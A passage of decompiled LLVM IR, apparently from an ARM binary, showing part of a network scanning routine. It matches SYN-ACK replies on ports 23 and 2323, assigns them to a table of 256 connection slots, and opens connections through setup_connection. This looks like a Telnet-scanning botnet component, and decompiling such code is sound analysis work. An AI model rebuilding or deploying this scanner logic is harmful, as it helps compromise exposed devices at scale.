  br i1 %v3_ea00, label %dec_label_pc_e9bc, label %dec_label_pc_ea04

dec_label_pc_ea04:                                ; preds = %dec_label_pc_e9fc
  store i32 %v2_e68c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d4.57 to i32), i32* %ip.global-to-local, align 4
  %v3_ea0c = load i32, i32* %v2_ea0c, align 4
  store i32 %v3_ea0c, i32* %r2.global-to-local, align 4
  %v2_ea10 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_ea10, i32* %r3.global-to-local, align 4
  %v3_ea14 = icmp uge i32 %v3_ea0c, %v2_ea10
  store i1 %v3_ea14, i1* %cpsr_c.global-to-local, align 1
  %v9_ea14 = icmp eq i32 %v3_ea0c, %v2_ea10
  store i1 %v9_ea14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ea14, label %dec_label_pc_ea1c, label %dec_label_pc_e9bc

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_ea04
  store i32 %v2_e68c, i32* @lr, align 4
  %v3_ea20 = load i8, i8* %v2_ea20, align 1
  %v4_ea20 = zext i8 %v3_ea20 to i32
  store i32 %v4_ea20, i32* %r3.global-to-local, align 4
  %v2_ea24 = icmp ugt i8 %v3_ea20, 5
  store i1 %v2_ea24, i1* %cpsr_c.global-to-local, align 1
  %v7_ea24 = icmp eq i8 %v3_ea20, 6
  store i1 %v7_ea24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea24, label %dec_label_pc_ea2c, label %dec_label_pc_e9bc

dec_label_pc_ea2c:                                ; preds = %dec_label_pc_ea1c
  %v0_ea2c = load i32, i32* @r4, align 4
  %v1_ea2c = inttoptr i32 %v0_ea2c to i16*
  %v2_ea2c = load i16, i16* %v1_ea2c, align 2
  %v3_ea2c = zext i16 %v2_ea2c to i32
  store i32 %v3_ea2c, i32* %ip.global-to-local, align 4
  %v2_ea30 = icmp ugt i16 %v2_ea2c, 5887
  store i1 %v2_ea30, i1* %cpsr_c.global-to-local, align 1
  %v7_ea30 = icmp eq i16 %v2_ea2c, 5888
  store i1 %v7_ea30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea30, label %dec_label_pc_ea48, label %dec_label_pc_ea38

dec_label_pc_ea38:                                ; preds = %dec_label_pc_ea2c
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_ea40 = icmp ugt i16 %v2_ea2c, 4872
  store i1 %v3_ea40, i1* %cpsr_c.global-to-local, align 1
  %v9_ea40 = icmp eq i16 %v2_ea2c, 4873
  store i1 %v9_ea40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ea40, label %dec_label_pc_ea48, label %dec_label_pc_e9bc

dec_label_pc_ea48:                                ; preds = %dec_label_pc_ea38, %dec_label_pc_ea2c
  %v1_ea48 = add i32 %v0_ea2c, 2
  %v2_ea48 = inttoptr i32 %v1_ea48 to i16*
  %v3_ea48 = load i16, i16* %v2_ea48, align 2
  %v4_ea48 = zext i16 %v3_ea48 to i32
  store i32 %v4_ea48, i32* %r3.global-to-local, align 4
  store i32 %v4_e55c, i32* %r0.global-to-local, align 4
  %v3_ea50 = icmp uge i32 %v4_ea48, %v4_e55c
  store i1 %v3_ea50, i1* %cpsr_c.global-to-local, align 1
  %v9_ea50 = icmp eq i32 %v4_ea48, %v4_e55c
  store i1 %v9_ea50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ea50, label %dec_label_pc_ea58, label %dec_label_pc_e9bc

dec_label_pc_ea58:                                ; preds = %dec_label_pc_ea48
  %v1_ea58 = add i32 %v0_ea2c, 13
  %v2_ea58 = inttoptr i32 %v1_ea58 to i8*
  %v3_ea58 = load i8, i8* %v2_ea58, align 1
  %v4_ea58 = zext i8 %v3_ea58 to i32
  store i32 %v4_ea58, i32* %r3.global-to-local, align 4
  %v1_ea5c = and i32 %v4_ea58, 2
  %v2_ea5c = icmp eq i32 %v1_ea5c, 0
  store i1 %v2_ea5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea5c, label %dec_label_pc_e9bc, label %dec_label_pc_ea64

dec_label_pc_ea64:                                ; preds = %dec_label_pc_ea58
  %v1_ea64 = and i32 %v4_ea58, 16
  %v2_ea64 = icmp eq i32 %v1_ea64, 0
  store i1 %v2_ea64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea64, label %dec_label_pc_e9bc, label %dec_label_pc_ea6c

dec_label_pc_ea6c:                                ; preds = %dec_label_pc_ea64
  %v1_ea6c = and i32 %v4_ea58, 4
  %v2_ea6c = icmp eq i32 %v1_ea6c, 0
  store i1 %v2_ea6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea6c, label %dec_label_pc_ea74, label %dec_label_pc_e9bc

dec_label_pc_ea74:                                ; preds = %dec_label_pc_ea6c
  %tmp = urem i8 %v3_ea58, 2
  %v2_ea74 = icmp eq i8 %tmp, 0
  store i1 %v2_ea74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea74, label %dec_label_pc_ea7c, label %dec_label_pc_e9bc

dec_label_pc_ea7c:                                ; preds = %dec_label_pc_ea74
  %v1_ea7c = add i32 %v0_ea2c, 8
  %v2_ea7c = inttoptr i32 %v1_ea7c to i32*
  %v3_ea7c = load i32, i32* %v2_ea7c, align 4
  %v5_ea94 = call i32 @llvm.bswap.i32(i32 %v3_ea7c)
  %v1_ea98 = add i32 %v5_ea94, -1
  store i32 %v1_ea98, i32* %r2.global-to-local, align 4
  %v1_ea9c = and i32 %v1_ea98, 16711680
  store i32 %v1_ea9c, i32* %r0.global-to-local, align 4
  %v3_eaa0 = udiv i32 %v1_ea98, 16777216
  %v4_eaa8 = udiv i32 %v1_ea9c, 256
  %v5_eaa8 = or i32 %v4_eaa8, %v3_eaa0
  %v1_eaa4 = mul i32 %v1_ea98, 256
  %v4_eaac = and i32 %v1_eaa4, 16711680
  %v5_eaac = or i32 %v5_eaa8, %v4_eaac
  store i32 %v5_eaac, i32* %r3.global-to-local, align 4
  store i32 %v2_e68c, i32* %r1.global-to-local, align 4
  %v3_eab4 = load i32, i32* %v2_eab4, align 4
  store i32 %v3_eab4, i32* @lr, align 4
  %v5_eab8 = call i32 @llvm.bswap.i32(i32 %v1_ea98)
  store i32 %v5_eab8, i32* %r3.global-to-local, align 4
  %v3_eabc = icmp uge i32 %v5_eab8, %v3_eab4
  store i1 %v3_eabc, i1* %cpsr_c.global-to-local, align 1
  %v9_eabc = icmp eq i32 %v5_eab8, %v3_eab4
  store i1 %v9_eabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_eabc, label %dec_label_pc_eac4, label %dec_label_pc_e9bc

dec_label_pc_eac4:                                ; preds = %dec_label_pc_ea7c
  %v0_eac4 = load i32, i32* @r5, align 4
  %v2_eac4 = icmp ugt i32 %v0_eac4, 254
  store i1 %v2_eac4, i1* %cpsr_c.global-to-local, align 1
  %v7_eac4 = icmp eq i32 %v0_eac4, 255
  store i1 %v7_eac4, i1* %cpsr_z.global-to-local, align 1
  %v8_eac8 = icmp sgt i32 %v0_eac4, 255
  br i1 %v8_eac8, label %dec_label_pc_eb44, label %dec_label_pc_eacc

dec_label_pc_eacc:                                ; preds = %dec_label_pc_eac4
  %v2_ead4 = load i32, i32* @global_var_243f0.149, align 4
  store i32 %v2_ead4, i32* %r1.global-to-local, align 4
  %v3_ead8 = mul i32 %v0_eac4, 256
  store i32 %v3_ead8, i32* %r2.global-to-local, align 4
  %v2_eadc = mul i32 %v0_eac4, 288
  store i32 %v2_eadc, i32* %r3.global-to-local, align 4
  %v2_eae0 = add i32 %v2_ead4, %v2_eadc
  store i32 %v2_eae0, i32* @r0, align 4
  %v1_eae4 = add i32 %v2_eae0, 12
  %v2_eae4 = inttoptr i32 %v1_eae4 to i32*
  %v3_eae4 = load i32, i32* %v2_eae4, align 4
  store i32 %v3_eae4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eae8 = icmp eq i32 %v3_eae4, 0
  store i1 %v2_eae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eae8, label %dec_label_pc_eb2c, label %dec_label_pc_eb08.preheader

dec_label_pc_eb08.preheader:                      ; preds = %dec_label_pc_eacc
  %v2_eaec = add i32 %v0_eac4, 1
  %v2_eaf4 = and i32 %v2_eaec, 134217728
  %v3_eaf4 = icmp ne i32 %v2_eaf4, 0
  store i1 %v3_eaf4, i1* %cpsr_c.global-to-local, align 1
  %v3_eaf8 = mul i32 %v2_eaec, 288
  %v3_eafc = add i32 %v2_ead4, %v3_eaf8
  store i32 %v3_eafc, i32* %r3.global-to-local, align 4
  store i32 %v0_eac4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eb08

dec_label_pc_eb08:                                ; preds = %dec_label_pc_eb08.preheader, %dec_label_pc_eb14
  %v0_eb14 = phi i32 [ %v3_eafc, %dec_label_pc_eb08.preheader ], [ %v1_eb20, %dec_label_pc_eb14 ]
  %v0_eb08 = phi i32 [ %v0_eac4, %dec_label_pc_eb08.preheader ], [ %v1_eb08, %dec_label_pc_eb14 ]
  %v1_eb08 = add i32 %v0_eb08, 1
  store i32 %v1_eb08, i32* %r2.global-to-local, align 4
  %v7_eb0c = icmp eq i32 %v1_eb08, 256
  br i1 %v7_eb0c, label %dec_label_pc_eb44.loopexit, label %dec_label_pc_eb14

dec_label_pc_eb14:                                ; preds = %dec_label_pc_eb08
  store i32 %v0_eb14, i32* @r0, align 4
  %v1_eb18 = add i32 %v0_eb14, 12
  %v2_eb18 = inttoptr i32 %v1_eb18 to i32*
  %v3_eb18 = load i32, i32* %v2_eb18, align 4
  %v2_eb1c = icmp eq i32 %v3_eb18, 0
  %v1_eb20 = add i32 %v0_eb14, 288
  store i32 %v1_eb20, i32* %r3.global-to-local, align 4
  br i1 %v2_eb1c, label %dec_label_pc_eb28, label %dec_label_pc_eb08

dec_label_pc_eb28:                                ; preds = %dec_label_pc_eb14
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eb08, i32* @r5, align 4
  br label %dec_label_pc_eb2c

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_eacc, %dec_label_pc_eb28
  %v1_eb34 = phi i32 [ %v2_eae0, %dec_label_pc_eacc ], [ %v0_eb14, %dec_label_pc_eb28 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb2c = icmp eq i32 %v1_eb34, 0
  store i1 %v2_eb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eb2c, label %dec_label_pc_eb44, label %dec_label_pc_eb34

dec_label_pc_eb34:                                ; preds = %dec_label_pc_eb2c
  %v2_eb34 = add i32 %v1_eb34, 16
  %v3_eb34 = inttoptr i32 %v2_eb34 to i32*
  store i32 %v3_eab4, i32* %v3_eb34, align 4
  %v0_eb38 = load i32, i32* %ip.global-to-local, align 4
  %v1_eb38 = trunc i32 %v0_eb38 to i16
  %v2_eb38 = load i32, i32* @r0, align 4
  %v3_eb38 = add i32 %v2_eb38, 20
  %v4_eb38 = inttoptr i32 %v3_eb38 to i16*
  store i16 %v1_eb38, i16* %v4_eb38, align 2
  %v0_eb3c = call i32 @setup_connection()
  store i32 %v0_eb3c, i32* %r0.global-to-local, align 4
  %v1_e9c0.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_e9bc

dec_label_pc_eb44.loopexit:                       ; preds = %dec_label_pc_eb08
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %dec_label_pc_e9f0, %dec_label_pc_e9bc, %dec_label_pc_eb2c, %dec_label_pc_eac4, %dec_label_pc_eb44.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_eb64513 = load i32, i32* @sp, align 4
  %v3_eb64514 = add i32 %v2_eb64513, 1676
  %v4_eb64515 = inttoptr i32 %v3_eb64514 to i32*
  store i32 0, i32* %v4_eb64515, align 4
  br label %dec_label_pc_eb50.dec_label_pc_eb50_crit_edge

dec_label_pc_eb50.dec_label_pc_eb50_crit_edge:    ; preds = %dec_label_pc_eb44, %dec_label_pc_eb50.dec_label_pc_eb50_crit_edge
  %v0_eb50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_eb54 = add i32 %v0_eb50.pre, 4
  store i32 %v1_eb54, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eb5c = add i32 %v0_eb50.pre, 1672
  store i32 %v1_eb5c, i32* %ip.global-to-local, align 4
  %v7_eb60 = icmp eq i32 %v1_eb54, 128
  %v2_eb64 = load i32, i32* @sp, align 4
  %v3_eb64 = add i32 %v2_eb64, %v1_eb5c
  %v4_eb64 = inttoptr i32 %v3_eb64 to i32*
  store i32 0, i32* %v4_eb64, align 4
  br i1 %v7_eb60, label %dec_label_pc_eb6c, label %dec_label_pc_eb50.dec_label_pc_eb50_crit_edge

dec_label_pc_eb6c:                                ; preds = %dec_label_pc_eb50.dec_label_pc_eb50_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_eb6c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_eb6c, i32* %stack_var_-352, align 4
  %v1_eb78516 = add i32 %v0_eb6c, 8
  store i32 %v1_eb78516, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_eb80517 = add i32 %v0_eb6c, 1548
  store i32 %v1_eb80517, i32* @lr, align 4
  %v7_eb84518 = icmp eq i32 %v1_eb78516, 128
  %v2_eb88519 = load i32, i32* @sp, align 4
  %v3_eb88520 = add i32 %v2_eb88519, %v1_eb80517
  %v4_eb88521 = inttoptr i32 %v3_eb88520 to i32*
  store i32 0, i32* %v4_eb88521, align 4
  br i1 %v7_eb84518, label %dec_label_pc_eb90, label %dec_label_pc_eb74.dec_label_pc_eb74_crit_edge

dec_label_pc_eb74.dec_label_pc_eb74_crit_edge:    ; preds = %dec_label_pc_eb6c, %dec_label_pc_eb74.dec_label_pc_eb74_crit_edge
  %v0_eb74.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_eb78 = add i32 %v0_eb74.pre, 4
  store i32 %v1_eb78, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_eb80 = add i32 %v0_eb74.pre, 1544
  store i32 %v1_eb80, i32* @lr, align 4
  %v7_eb84 = icmp eq i32 %v1_eb78, 128
  %v2_eb88 = load i32, i32* @sp, align 4
  %v3_eb88 = add i32 %v2_eb88, %v1_eb80
  %v4_eb88 = inttoptr i32 %v3_eb88 to i32*
  store i32 0, i32* %v4_eb88, align 4
  br i1 %v7_eb84, label %dec_label_pc_eb90, label %dec_label_pc_eb74.dec_label_pc_eb74_crit_edge

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eb74.dec_label_pc_eb74_crit_edge, %dec_label_pc_eb6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_eb90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_eb90, i32* @r6, align 4
  store i32 %v0_eb90, i32* @r5, align 4
  store i32 %v0_eb90, i32* %stack_var_-52, align 4
  br label %dec_label_pc_ebec

dec_label_pc_eba0:                                ; preds = %dec_label_pc_ec1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec08, i1* %cpsr_z.global-to-local, align 1
  %v1_ec8c = add i32 %v2_ec00, 4
  %v2_ec8c = inttoptr i32 %v1_ec8c to i32*
  %v3_ec8c = load i32, i32* %v2_ec8c, align 4
  br i1 %v7_ec08, label %dec_label_pc_ec8c, label %dec_label_pc_eba8

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eba0
  store i32 %v3_ec8c, i32* %ip.global-to-local, align 4
  %v3_ebac = udiv i32 %v3_ec8c, 32
  store i32 %v2_ec98, i32* %r0.global-to-local, align 4
  %v3_ebb4 = mul nuw nsw i32 %v3_ebac, 4
  %v2_ebb8 = add i32 %v3_ebb4, %v2_ec98
  store i32 %v2_ebb8, i32* %r3.global-to-local, align 4
  %v1_ebbc = add i32 %v2_ebb8, -184
  %v2_ebbc = inttoptr i32 %v1_ebbc to i32*
  %v3_ebbc = load i32, i32* %v2_ebbc, align 4
  %v1_ebc0 = urem i32 %v3_ec8c, 32
  store i32 %v1_ebc0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_ebc8 = shl i32 1, %v1_ebc0
  %v8_ebc8 = or i32 %v3_ebbc, %v7_ebc8
  store i32 %v8_ebc8, i32* %r2.global-to-local, align 4
  store i32 %v8_ebc8, i32* %v2_ebbc, align 4
  %v0_ebd0 = load i32, i32* @r6, align 4
  %v1_ebd0 = load i32, i32* %ip.global-to-local, align 4
  %v3_ebd0 = icmp uge i32 %v0_ebd0, %v1_ebd0
  store i1 %v3_ebd0, i1* %cpsr_c.global-to-local, align 1
  %v9_ebd0 = icmp eq i32 %v0_ebd0, %v1_ebd0
  store i1 %v9_ebd0, i1* %cpsr_z.global-to-local, align 1
  %v5_ebd4 = icmp slt i32 %v0_ebd0, %v1_ebd0
  br i1 %v5_ebd4, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_eba8
  store i32 %v1_ebd0, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread75, %bb416, %bb414, %bb418, %dec_label_pc_ec80, %dec_label_pc_eba8, %bb409
  %v3_ebd8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ebd8, i32* %r3.global-to-local, align 4
  %v1_ebdc = add i32 %v3_ebd8, 1
  store i32 %v1_ebdc, i32* %r2.global-to-local, align 4
  %v2_ebe0 = icmp ugt i32 %v1_ebdc, 254
  store i1 %v2_ebe0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebe0 = icmp eq i32 %v1_ebdc, 255
  store i1 %v7_ebe0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ebdc, i32* %stack_var_-52, align 4
  %v8_ebe8 = icmp sgt i32 %v1_ebdc, 255
  br i1 %v8_ebe8, label %dec_label_pc_ecbc, label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %bb410, %dec_label_pc_eb90
  %v0_ebf8 = phi i32 [ %v1_ebdc, %bb410 ], [ %v0_eb90, %dec_label_pc_eb90 ]
  store i32 ptrtoint (i32* @global_var_243f0.149 to i32), i32* %r0.global-to-local, align 4
  %v3_ebf0 = mul i32 %v0_ebf8, 256
  store i32 %v3_ebf0, i32* %r3.global-to-local, align 4
  %v2_ebf4 = load i32, i32* @global_var_243f0.149, align 4
  store i32 %v2_ebf4, i32* @r1, align 4
  %v2_ebfc = mul i32 %v0_ebf8, 288
  store i32 %v2_ebfc, i32* %r2.global-to-local, align 4
  %v2_ec00 = add i32 %v2_ebf4, %v2_ebfc
  store i32 %v2_ec00, i32* @r4, align 4
  %v1_ec04 = add i32 %v2_ec00, 12
  %v2_ec04 = inttoptr i32 %v1_ec04 to i32*
  %v3_ec04 = load i32, i32* %v2_ec04, align 4
  store i32 %v3_ec04, i32* %ip.global-to-local, align 4
  %v2_ec08 = icmp ne i32 %v3_ec04, 0
  store i1 %v2_ec08, i1* %cpsr_c.global-to-local, align 1
  %v7_ec08 = icmp eq i32 %v3_ec04, 1
  store i1 %v7_ec08, i1* %cpsr_z.global-to-local, align 1
  %v2_ec0c = xor i1 %v2_ec08, true
  %v3_ec0c = or i1 %v7_ec08, %v2_ec0c
  br i1 %v3_ec0c, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_ebec
  store i32 5, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_ebec, %bb411
  %v1_ec2c215 = phi i32 [ %v2_ebf4, %dec_label_pc_ebec ], [ 5, %bb411 ]
  %v2_ec10 = xor i1 %v7_ec08, true
  %v3_ec10 = and i1 %v2_ec08, %v2_ec10
  br i1 %v3_ec10, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* @r1, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_ec2c = phi i32 [ %v1_ec2c215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec14 = icmp eq i32 %v3_ec04, 0
  store i1 %v2_ec14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec14, label %bb410, label %dec_label_pc_ec1c

dec_label_pc_ec1c:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_2190c.137 to i32), i32* %r2.global-to-local, align 4
  %v2_ec20 = load i32, i32* @global_var_2190c.137, align 4
  store i32 %v2_ec20, i32* %r3.global-to-local, align 4
  %v1_ec24 = add i32 %v2_ec00, 8
  %v2_ec24 = inttoptr i32 %v1_ec24 to i32*
  %v3_ec24 = load i32, i32* %v2_ec24, align 4
  store i32 %v3_ec24, i32* %r2.global-to-local, align 4
  %v2_ec28 = sub i32 %v2_ec20, %v3_ec24
  store i32 %v2_ec28, i32* %r3.global-to-local, align 4
  %v3_ec2c = icmp uge i32 %v2_ec28, %v1_ec2c
  store i1 %v3_ec2c, i1* %cpsr_c.global-to-local, align 1
  %v9_ec2c = icmp eq i32 %v2_ec28, %v1_ec2c
  store i1 %v9_ec2c, i1* %cpsr_z.global-to-local, align 1
  %v2_ec30 = xor i1 %v3_ec2c, true
  %v3_ec30 = or i1 %v9_ec2c, %v2_ec30
  br i1 %v3_ec30, label %dec_label_pc_eba0, label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec1c
  %v1_ec34 = add i32 %v2_ec00, 4
  %v2_ec34 = inttoptr i32 %v1_ec34 to i32*
  %v3_ec34 = load i32, i32* %v2_ec34, align 4
  store i32 %v3_ec34, i32* %r0.global-to-local, align 4
  %v1_ec38 = call i32 @__GI___libc_close(i32 %v3_ec34)
  store i32 %v1_ec38, i32* %r0.global-to-local, align 4
  %v0_ec3c = load i32, i32* @r4, align 4
  %v1_ec3c = add i32 %v0_ec3c, 12
  %v2_ec3c = inttoptr i32 %v1_ec3c to i32*
  %v3_ec3c = load i32, i32* %v2_ec3c, align 4
  store i32 %v3_ec3c, i32* %r3.global-to-local, align 4
  %v2_ec40 = icmp ugt i32 %v3_ec3c, 1
  store i1 %v2_ec40, i1* %cpsr_c.global-to-local, align 1
  %v7_ec40 = icmp eq i32 %v3_ec3c, 2
  store i1 %v7_ec40, i1* %cpsr_z.global-to-local, align 1
  %v2_ec44 = xor i1 %v2_ec40, true
  %v3_ec44 = or i1 %v7_ec40, %v2_ec44
  br i1 %v3_ec44, label %bb415, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_ec34
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ec4c298302 = add i32 %v0_ec3c, 4
  %v3_ec4c299303 = inttoptr i32 %v2_ec4c298302 to i32*
  store i32 -1, i32* %v3_ec4c299303, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_ec34
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ec4c295 = add i32 %v0_ec3c, 4
  %v3_ec4c296 = inttoptr i32 %v2_ec4c295 to i32*
  store i32 -1, i32* %v3_ec4c296, align 4
  %v4_ec50 = load i32, i32* %r3.global-to-local, align 4
  %v5_ec50 = load i32, i32* @r4, align 4
  %v6_ec50 = add i32 %v5_ec50, 12
  %v7_ec50 = inttoptr i32 %v6_ec50 to i32*
  store i32 %v4_ec50, i32* %v7_ec50, align 4
  %v4_ec54 = load i32, i32* %r3.global-to-local, align 4
  %v5_ec54 = trunc i32 %v4_ec54 to i8
  %v6_ec54 = load i32, i32* @r4, align 4
  %v7_ec54 = add i32 %v6_ec54, 284
  %v8_ec54 = inttoptr i32 %v7_ec54 to i8*
  store i8 %v5_ec54, i8* %v8_ec54, align 1
  %v0_ec58.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ec58.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread301, %bb415
  %v1_ec58 = phi i1 [ %v1_ec58.pre, %bb415 ], [ %v2_ec40, %.thread301 ]
  %v0_ec58 = phi i1 [ %v0_ec58.pre, %bb415 ], [ false, %.thread301 ]
  %v2_ec58 = xor i1 %v1_ec58, true
  %v3_ec58 = or i1 %v0_ec58, %v2_ec58
  br i1 %v3_ec58, label %bb410, label %dec_label_pc_ec5c

dec_label_pc_ec5c:                                ; preds = %bb416
  %v0_ec5c = load i32, i32* @r4, align 4
  %v1_ec5c = add i32 %v0_ec5c, 284
  %v2_ec5c = inttoptr i32 %v1_ec5c to i8*
  %v3_ec5c = load i8, i8* %v2_ec5c, align 1
  %v4_ec5c = zext i8 %v3_ec5c to i32
  %v1_ec60 = add nuw nsw i32 %v4_ec5c, 1
  %v1_ec64 = urem i32 %v1_ec60, 256
  store i32 %v1_ec64, i32* %r3.global-to-local, align 4
  %v2_ec68 = icmp ugt i32 %v1_ec64, 9
  store i1 %v2_ec68, i1* %cpsr_c.global-to-local, align 1
  %v7_ec68 = icmp eq i32 %v1_ec64, 10
  store i1 %v7_ec68, i1* %cpsr_z.global-to-local, align 1
  %v1_ec6c = trunc i32 %v1_ec60 to i8
  store i8 %v1_ec6c, i8* %v2_ec5c, align 1
  %v0_ec70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec70, label %.thread75, label %dec_label_pc_ec80

.thread75:                                        ; preds = %dec_label_pc_ec5c
  %v1_ec70 = load i32, i32* %r3.global-to-local, align 4
  %v2_ec70 = add i32 %v1_ec70, -10
  store i32 %v2_ec70, i32* %r3.global-to-local, align 4
  %v2_ec74 = load i32, i32* @r4, align 4
  %v3_ec74 = add i32 %v2_ec74, 12
  %v4_ec74 = inttoptr i32 %v3_ec74 to i32*
  store i32 %v2_ec70, i32* %v4_ec74, align 4
  %v1_ec78 = load i32, i32* %r3.global-to-local, align 4
  %v2_ec78 = trunc i32 %v1_ec78 to i8
  %v3_ec78 = load i32, i32* @r4, align 4
  %v4_ec78 = add i32 %v3_ec78, 284
  %v5_ec78 = inttoptr i32 %v4_ec78 to i8*
  store i8 %v2_ec78, i8* %v5_ec78, align 1
  %v0_ec7c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec7c.pr.pr, label %bb410, label %dec_label_pc_ec80

dec_label_pc_ec80:                                ; preds = %dec_label_pc_ec5c, %.thread75
  %v0_ec80 = load i32, i32* @r4, align 4
  store i32 %v0_ec80, i32* @r0, align 4
  %v0_ec84 = call i32 @setup_connection()
  store i32 %v0_ec84, i32* %r0.global-to-local, align 4
  br label %bb410

dec_label_pc_ec8c:                                ; preds = %dec_label_pc_eba0
  store i32 %v3_ec8c, i32* %r0.global-to-local, align 4
  %v3_ec90 = udiv i32 %v3_ec8c, 32
  %v3_ec94 = mul nuw nsw i32 %v3_ec90, 4
  store i32 %v2_ec98, i32* @lr, align 4
  %v2_ec9c = add i32 %v3_ec94, %v2_ec98
  store i32 %v2_ec9c, i32* %r3.global-to-local, align 4
  %v1_eca0 = add i32 %v2_ec9c, -312
  %v2_eca0 = inttoptr i32 %v1_eca0 to i32*
  %v3_eca0 = load i32, i32* %v2_eca0, align 4
  %v1_eca4 = urem i32 %v3_ec8c, 32
  store i32 %v1_eca4, i32* %r1.global-to-local, align 4
  %v7_eca8 = shl i32 1, %v1_eca4
  %v8_eca8 = or i32 %v3_eca0, %v7_eca8
  store i32 %v8_eca8, i32* %r2.global-to-local, align 4
  %v0_ecac = load i32, i32* @r5, align 4
  %v3_ecac = icmp uge i32 %v0_ecac, %v3_ec8c
  store i1 %v3_ecac, i1* %cpsr_c.global-to-local, align 1
  %v9_ecac = icmp eq i32 %v0_ecac, %v3_ec8c
  store i1 %v9_ecac, i1* %cpsr_z.global-to-local, align 1
  %v5_ecb0 = icmp slt i32 %v0_ecac, %v3_ec8c
  br i1 %v5_ecb0, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_ec8c
  store i32 %v3_ec8c, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_ec8c, %bb417
  store i32 %v8_eca8, i32* %v2_eca0, align 4
  br label %bb410

dec_label_pc_ecbc:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_ecc8 = load i32, i32* @r5, align 4
  %v1_ecc8 = load i32, i32* @r6, align 4
  %v3_ecc8 = icmp uge i32 %v0_ecc8, %v1_ecc8
  store i1 %v3_ecc8, i1* %cpsr_c.global-to-local, align 1
  %v9_ecc8 = icmp eq i32 %v0_ecc8, %v1_ecc8
  store i1 %v9_ecc8, i1* %cpsr_z.global-to-local, align 1
  %v5_eccc = icmp slt i32 %v0_ecc8, %v1_ecc8
  %storemerge155 = select i1 %v5_eccc, i32 %v1_ecc8, i32 %v0_ecc8
  store i32 %v2_ece0, i32* %ip.global-to-local, align 4
  store i32 %v2_ece4, i32* %r1.global-to-local, align 4
  store i32 %v2_ece8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ecf0 = add i32 %storemerge155, 1
  store i32 %v1_ecf0, i32* %r0.global-to-local, align 4
  %v5_ecfc = call i32 @__libc_select(i32 %v1_ecf0, i32 %v2_ece4, i32 %v2_ece8, i32 0, i32 %v2_ece0)
